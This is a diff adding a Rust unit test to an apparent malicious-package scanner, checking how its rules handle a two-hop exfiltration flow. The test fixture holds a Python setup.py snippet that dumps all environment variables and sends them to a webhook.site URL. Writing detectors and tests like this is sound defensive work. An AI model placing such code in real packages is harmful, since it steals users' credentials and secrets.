@@ -3684,6 +3684,41 @@ mod reconcile {
         assert_eq!(chained("app.py", &header, "EXFIL-CHAIN-001"), None);
     }
 
+    /// The cost, measured on the Datadog selection: artifact-lab-3-package
+    /// (17 versions) binds `data = dict(os.environ)`, encodes it into
+    /// `encoded_data`, and sends `Request(url, data=encoded_data)` beside a
+    /// webhook URL. The word reading linked the keyword `data=` to the
+    /// variable `data`: the right answer by a coincidence of names (the same
+    /// flow with the variable called `env` never linked). The flow is two
+    /// hops, which the one-hop linker does not follow, so the chain is gone;
+    /// NET-007 still reports the webhook host at Critical.
+    #[test]
+    fn exfil_chain_does_not_follow_a_two_hop_flow() {
+        let sweep = "import os\n\
+            import urllib.request\n\
+            import urllib.parse\n\
+            \n\
+            def notmalfunc():\n\
+            \x20   data = dict(os.environ)\n\
+            \x20   print(data)\n\
+            \x20   encoded_data = urllib.parse.urlencode(data).encode()\n\
+            \x20   url = 'https://webhook.site/00000000-0000-0000-0000-000000000000'\n\
+            \x20   req = urllib.request.Request(url, data=encoded_data)\n\
+            \x20   urllib.request.urlopen(req)\n";
+        assert!(fires("setup.py", sweep, "CRED-ENV-001"));
+        assert!(severities("setup.py", sweep, "NET-007").contains(&Severity::Critical));
+        assert_eq!(chained("setup.py", sweep, "EXFIL-CHAIN-001"), None);
+        // Encoded and sent in one statement, the environment is the value.
+        let one_hop = sweep.replace(
+            "data=encoded_data",
+            "data=urllib.parse.urlencode(data).encode()",
+        );
+        assert_eq!(
+            chained("setup.py", &one_hop, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+    }
+
     #[test]
     fn agent_chains_do_not_link_a_key_that_repeats_the_name() {
         // A secret sweep counted locally; the report's `secrets` key carries
